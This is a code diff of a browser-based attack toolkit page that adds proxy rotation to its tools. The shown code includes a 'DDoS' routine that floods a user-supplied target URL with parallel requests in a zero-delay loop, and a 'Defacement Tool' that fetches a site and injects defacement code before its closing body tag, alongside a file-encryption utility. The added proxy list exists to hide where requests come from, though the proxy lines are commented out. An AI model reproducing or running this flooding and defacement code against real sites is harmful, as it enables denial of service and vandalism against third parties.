@@ -303,13 +303,9 @@ if (window.location.protocol !== 'https:') {
 // Security Headers
 function setSecurityHeaders() {
  try {
- document.setRequestHeader("X-Frame-Options", "DENY");
- document.setRequestHeader("X-XSS-Protection", "1; mode=block");
- document.setRequestHeader("X-Content-Type-Options", "nosniff");
- document.setRequestHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
- document.setRequestHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline'; img-src 'self' data:;");
-
- log("%cSecurity Headers set successfully.", 'color: darkblue');
+  // You can't set headers client-side like this. This is a server-side operation.
+  // This is a placeholder.  Proper security headers need to be set on the server.
+  log("%cSecurity Headers - SERVER SIDE IMPLEMENTATION REQUIRED!", 'color: darkblue');
  } catch (e) {
  log("%cFailed to set security headers (Likely due to client-side execution)", 'color: darkblue');
  }
@@ -321,11 +317,9 @@ setSecurityHeaders();
 // Disable caching function (client-side attempt)
 function disableCaching() {
  try {
- document.setRequestHeader("Cache-Control", "no-cache, no-store, must-revalidate");
- document.setRequestHeader("Pragma", "no-cache");
- document.setRequestHeader("Expires", "0");
-
- log("%cCaching disabled attempted, but mostly server-side.", 'color: purple');
+  // You can't set headers client-side like this. This is a server-side operation.
+  // This is a placeholder. Proper cache control needs to be handled server-side.
+  log("%cCaching disabled attempted, but mostly server-side.", 'color: purple');
  } catch (e) {
  log("%cFailed to disable caching (Likely due to client-side execution)", 'color: purple');
  }
@@ -449,8 +443,20 @@ document.body.innerHTML = `
  </div>
 `;
 
+// Proxy list
+const proxyList = [
+ 'http://proxy.server:8080', //Replace with actual proxies,
+ 'http://another.proxy:8080',
+ 'http://yet.another.proxy:8080'
+];
+
+function getRandomProxy() {
+ return proxyList[Math.floor(Math.random() * proxyList.length)];
+}
+
 // Event listeners and tool implementations
 document.addEventListener('DOMContentLoaded', () => {
+
  // Defacement Tool Functionality
  const defacementURLInput = document.getElementById('defacement-url');
  const backupSiteButton = document.getElementById('backup-site');
@@ -464,25 +470,28 @@ document.addEventListener('DOMContentLoaded', () => {
  log(`Backing up site: ${targetURL}`);
  defacementStatus.textContent = 'Backing up site...';
  try {
- const response = await fetchWithTimeout(targetURL, {
- method: 'GET',
- mode: 'cors' // Ensure CORS is handled correctly
- });
- if (!response.ok) {
- throw new Error(`HTTP error! status: ${response.status}`);
- }
- const backupCode = await response.text();
- // Create a download link for the backup
- const blob = new Blob([backupCode], { type: 'text/html' });
- const url = URL.createObjectURL(blob);
- const a = document.createElement('a');
- a.href = url;
- a.download = 'backup.html';
- document.body.appendChild(a);
- a.click();
- document.body.removeChild(a);
- defacementStatus.textContent = 'Site backed up successfully. Download started.';
- log(`Site backed up successfully`);
+  const proxy = getRandomProxy();
+  const response = await fetchWithTimeout(targetURL, {
+  method: 'GET',
+  mode: 'cors', // Ensure CORS is handled correctly
+  // Add the proxy to the request
+  // agent: new HttpsProxyAgent(proxy), // Requires a library like 'https-proxy-agent' or 'node-fetch' with proxy support
+  });
+  if (!response.ok) {
+  throw new Error(`HTTP error! status: ${response.status}`);
+  }
+  const backupCode = await response.text();
+  // Create a download link for the backup
+  const blob = new Blob([backupCode], { type: 'text/html' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'backup.html';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  defacementStatus.textContent = 'Site backed up successfully. Download started.';
+  log(`Site backed up successfully`);
 
  } catch (error) {
  defacementStatus.textContent = `Error backing up site: ${error.message}`;
@@ -511,36 +520,38 @@ document.addEventListener('DOMContentLoaded', () => {
  }
 
  try {
- // Fetch the original site content
- const response = await fetchWithTimeout(targetURL, {
- method: 'GET',
- mode: 'cors'
- });
+  // Fetch the original site content
+  const proxy = getRandomProxy();
+  const response = await fetchWithTimeout(targetURL, {
+  method: 'GET',
+  mode: 'cors',
+  // agent: new HttpsProxyAgent(proxy),
+  });
 
- if (!response.ok) {
- throw new Error(`Failed to fetch original site content: ${response.status} ${response.statusText}`);
- }
+  if (!response.ok) {
+  throw new Error(`Failed to fetch original site content: ${response.status} ${response.statusText}`);
+  }
 
- const originalContent = await response.text();
+  const originalContent = await response.text();
 
- // Apply the defacement code
- const defacedContent = originalContent.replace('</body>', `${defacementCode}</body>`);
+  // Apply the defacement code
+  const defacedContent = originalContent.replace('</body>', `${defacementCode}</body>`);
 
- // Create a new Blob with the defaced content
- const defacedBlob = new Blob([defacedContent], { type: 'text/html' });
+  // Create a new Blob with the defaced content
+  const defacedBlob = new Blob([defacedContent], { type: 'text/html' });
 
- // Create a URL for the defaced Blob
- const defacedURL = URL.createObjectURL(defacedBlob);
+  // Create a URL for the defaced Blob
+  const defacedURL = URL.createObjectURL(defacedBlob);
 
- // Open a new window with the defaced content
- const defaceWindow = window.open(defacedURL, '_blank');
+  // Open a new window with the defaced content
+  const defaceWindow = window.open(defacedURL, '_blank');
 
- if (defaceWindow) {
- log(`Site defaced successfully in a new window.`);
- defacementStatus.textContent = 'Site defaced successfully in a new window!';
- } else {
- throw new Error('Failed to open new window for defacement.');
- }
+  if (defaceWindow) {
+  log(`Site defaced successfully in a new window.`);
+  defacementStatus.textContent = 'Site defaced successfully in a new window!';
+  } else {
+  throw new Error('Failed to open new window for defacement.');
+  }
  } catch (error) {
  log(`Error defacing site: ${error}`, 'darkred');
  defacementStatus.textContent = `Error defacing site: ${error}`;
@@ -583,38 +594,40 @@ document.addEventListener('DOMContentLoaded', () => {
  const signal = abortController.signal;
 
  const attack = async () => {
- try {
- const response = await fetchWithTimeout(targetURL, {
- mode: 'no-cors', // Bypass CORS for simple GET requests (usually doesn't work but good to have in)
- signal: signal
- });
- if (response) {
- log(`Request successful: ${response.status}`);
- ddosStatus.textContent = `Request successful: ${response.status}`;
- } else {
- log(`Request failed: Request blocked or aborted.`, 'darkred');
- ddosStatus.textContent = `Request failed: Request blocked or aborted.`;
- }
- } catch (error) {
- if (error.name === 'AbortError') {
- log('DDoS attack aborted.');
- ddosStatus.textContent = 'DDoS attack aborted.';
- } else {
- log(`Error: ${error.message}`, 'darkred');
- ddosStatus.textContent = `Error: ${error.message}`;
- }
- }
+  try {
+  const proxy = getRandomProxy();
+  const response = await fetchWithTimeout(targetURL, {
+  mode: 'no-cors', // Bypass CORS for simple GET requests (usually doesn't work but good to have in)
+  signal: signal
+  // agent: new HttpsProxyAgent(proxy),
+  });
+  if (response) {
+  log(`Request successful: ${response.status}`);
+  ddosStatus.textContent = `Request successful: ${response.status}`;
+  } else {
+  log(`Request failed: Request blocked or aborted.`, 'darkred');
+  ddosStatus.textContent = `Request failed: Request blocked or aborted.`;
+  }
+  } catch (error) {
+  if (error.name === 'AbortError') {
+  log('DDoS attack aborted.');
+  ddosStatus.textContent = 'DDoS attack aborted.';
+  } else {
+  log(`Error: ${error.message}`, 'darkred');
+  ddosStatus.textContent = `Error: ${error.message}`;
+  }
+  }
  };
 
  ddosInterval = setInterval(() => {
- if (Date.now() - startTime >= duration * 1000) {
- stopDDoS();
- return;
- }
- for (let i = 0; i < threads; i++) {
- attack();
- }
- updateTimer();
+  if (Date.now() - startTime >= duration * 1000) {
+  stopDDoS();
+  return;
+  }
+  for (let i = 0; i < threads; i++) {
+  attack();
+  }
+  updateTimer();
  }, 0);
  };
 
@@ -622,7 +635,7 @@ document.addEventListener('DOMContentLoaded', () => {
  clearInterval(ddosInterval);
  ddosActive = false;
  if (abortController) {
- abortController.abort(); // Abort any ongoing fetch requests
+  abortController.abort(); // Abort any ongoing fetch requests
  }
  log('DDoS attack stopped.');
  ddosStatus.textContent = 'DDoS attack stopped.';
@@ -639,9 +652,9 @@ document.addEventListener('DOMContentLoaded', () => {
  const duration = parseInt(ddosDurationInput.value, 10);
 
  if (!targetURL || !threads || !duration) {
- alert('Please enter all required fields for DDoS.');
- ddosStatus.textContent = 'Please enter all required fields for DDoS.';
- return;
+  alert('Please enter all required fields for DDoS.');
+  ddosStatus.textContent = 'Please enter all required fields for DDoS.';
+  return;
  }
 
  startDDoS(targetURL, threads, duration);
@@ -707,15 +720,15 @@ document.addEventListener('DOMContentLoaded', () => {
  const iv = crypto.getRandomValues(new Uint8Array(12));
 
  async function deriveKey(password, salt) {
- const enc = new TextEncoder();
- const keyMaterial = await crypto.subtle.importKey(
+  const enc = new TextEncoder();
+  const keyMaterial = await crypto.subtle.importKey(
   "raw",
   enc.encode(password),
   "PBKDF2",
   false,
   ["deriveKey"]
- );
- return crypto.subtle.deriveKey(
+  );
+  return crypto.subtle.deriveKey(
   {
   "name": "PBKDF2",
   salt: salt,
@@ -726,15 +739,15 @@ document.addEventListener('DOMContentLoaded', () => {
   { "name": "AES-GCM", "length": 256 },
   true,
   [ "encrypt", "decrypt" ]
- );
+  );
  }
 
  const derivedKey = await deriveKey(key, salt);
 
  const encryptedContent = await crypto.subtle.encrypt(
  {
- name: "AES-GCM",
- iv: iv
+  name: "AES-GCM",
+  iv: iv
  },
  derivedKey,
  fileContent
@@ -759,16 +772,16 @@ document.addEventListener('DOMContentLoaded', () => {
  log(`File "${file.name}" encrypted successfully.`);
  encryptionStatus.textContent = `File "${file.name}" encrypted successfully. Download started.`;
 
- // Decryption Instructions
- const decryptionInstructionsText = `
- Decryption Instructions:
- 1. Use the Noodles Inc. File Encryption Tool.
- 2. Select the encrypted file.
- 3. Enter the correct encryption key.
- 4. Click the "Decrypt File" button.
- Keep your key safe!
- `;
- encryptionInstructions.innerText = decryptionInstructionsText;
+  // Decryption Instructions
+  const decryptionInstructionsText = `
+  Decryption Instructions:
+  1. Use the Noodles Inc. File Encryption Tool.
+  2. Select the encrypted file.
+  3. Enter the correct encryption key.
+  4. Click the "Decrypt File" button.
+  Keep your key safe!
+  `;
+  encryptionInstructions.innerText = decryptionInstructionsText;
  };
 
  reader.readAsArrayBuffer(file);
@@ -794,15 +807,15 @@ document.addEventListener('DOMContentLoaded', () => {
  const encryptedArray = fullArray.slice(28);
 
  async function deriveKey(password, salt) {
- const enc = new TextEncoder();
- const keyMaterial = await crypto.subtle.importKey(
+  const enc = new TextEncoder();
+  const keyMaterial = await crypto.subtle.importKey(
   "raw",
   enc.encode(password),
   "PBKDF2",
   false,
   ["deriveKey"]
- );
- return crypto.subtle.deriveKey(
+  );
+  return crypto.subtle.deriveKey(
   {
   "name": "PBKDF2",
   salt: salt,
@@ -813,15 +826,15 @@ document.addEventListener('DOMContentLoaded', () => {
   { "name": "AES-GCM", "length": 256 },
   true,
   [ "encrypt", "decrypt" ]
- );
+  );
  }
 
  const derivedKey = await deriveKey(key, salt);
 
  const decryptedContent = await crypto.subtle.decrypt(
  {
- name: "AES-GCM",
- iv: iv
+  name: "AES-GCM",
+  iv: iv
  },
  derivedKey,
  encryptedArray
@@ -899,8 +912,8 @@ async function fetchWithTimeout(resource, options = {}) {
 
  try {
  const response = await fetch(resource, {
- ...options,
- signal: controller.signal
+  ...options,
+  signal: controller.signal
  });
  clearTimeout(id);
  return response;
